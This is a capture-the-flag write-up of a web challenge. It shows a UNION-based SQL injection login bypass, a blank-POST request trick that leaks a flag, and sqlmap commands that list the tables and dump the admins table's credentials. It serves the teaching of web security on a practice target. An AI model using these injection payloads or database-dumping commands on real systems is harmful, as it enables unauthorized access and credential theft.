# FLAG 0
Finding this flag started with me **testing all inputs with special characters** for example the single quote
When entering the single quote into the username field of the login page a error will be displayed on the users screen

```py
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")
```
From this error you get two useful pieces of information **the type of DB and the query**
To simplify the query we will assume the input is called "USERINPUT" this isn't important to finding the flag just so I can show how the query works.

```sql
SELECT password
FROM admins
WHERE username='USERINPUT'
```
Now that we know the query we can **exploit it**.

I was unsure of how to exploit this query until i got the hint 
```
Getting admin access might require a more perfect union
```
This told me that it will be a SQL injection using a union. Creating the next part of the query took me some time researching mostly watching videos such as computerphiles two SQL injection videos.
After researching it occured to me that when using the single quote I am ending the current query and am now in control of what happens next.
```sql
'UNION SELECT 'pass' AS password from admins where '1' = '1 
```
When you enter this into the username field it will set the password to 123 and it has to be correct due to the '1' = '1 which always returns true
The full query looks like this.

```SQL
SELECT password
FROM admins
WHERE username='USERINPUT''UNION SELECT 'pass' AS password from admins where '1' = '1 
```
Once entered you will be greeted by the logged in screen and a private page with the flag.

# FLAG 1
Finding this flag took some time. I first got the hint number 1
```
What actions could you perform as a regular user on the last level, which you can't now?
```
This pointed me towards either the edit page or the create page after some failed attempts at exploiting either of these pages I took the second hint
```
Just because request fails with one method doesn't mean it will fail with a different method
``` 
This was obviously talking about the **QUEST METHODS**. POST , HEAD, GET , OPTIONS. 

Once I knew it had something to do with the METHOD I opened up firefoxes f12 networking page and edited and resend the requests. 

I started on the create page and first sent OPTIONS to see which METHOD could be used. After trying each of these METHODs nothing seemed to work so I moved to the edit page and tried there.

When the edit page is sent a REQUEST with the method POST it will give an error 400 or bad request. Once I saw it was a bad request I sent again after **removing** all the request headers to see what a blank POST request would yield.

It yielded a STATUS 200 and the flag in responce. 

Going back and testing this on the create page does not yield the same result and you will not get the flag.

# FLAG 2
The final flag started with the hint 
```
Credentials are secret, flags are secret. Coincidence?
``` 
This made me think that either the username or password are the flag. 

I started to gather the information I know about the DB which is that it runs on MariaDB and that it uses atleast two columns called username and password.

Remembering something I had read there was a program called SQLMAP that could be used to map SQL databases. Unknowing about the tool I researched it and booted up my linux VM.

after trying to use the URL within SQLMAP like below 
```
SQLMAP -U http://35.227.24.107/c9c02a8fea/login
```
and coming up with no results i looked at the -hh of SQLMAP and found -r which would use a request file.

I knew that everytime you click login it made a request so I launched burpsuite and captured the request to see what it looked like.

```
POST /c9c02a8fea/login HTTP/1.1

Host: 35.227.24.107

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 19

Origin: http://35.227.24.107

Connection: close

Referer: http://35.227.24.107/c9c02a8fea/login

Upgrade-Insecure-Requests: 1



username=&password=
```
This shows that the column names are definately username and password so now it was time to use this request within SQLMAP.

```
sqlmap -r /home/ewan/Desktop/1.request --tables
``` 
This returned all the tables within the DB and the one that stood out as important was this one. 
```
Database: level2
[2 tables]
+----------------------------------------------------+
| admins                                             |
| pages                                              |
+----------------------------------------------------+
```
The next step was gaining access to the information within these tables specifically the admins table.
After some testing with different commands I found the --dump command and attempted to use it on the table 'admins'. 
```
sqlmap -r /home/ewan/Desktop/1.request -T admins --dump
```
This returned 
```
Database: level2
Table: admins
[1 entry]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | malissa  | herman   |
+----+----------+----------+

```
So now we have the username and password for the website. Once entered on the page you get the final flag.

# Conclusion
This was a challenge to complete but with some research it was figured out. I look forward to the next web based CTF I do.

If you wish to contact me add me on discord at Ewan#8585

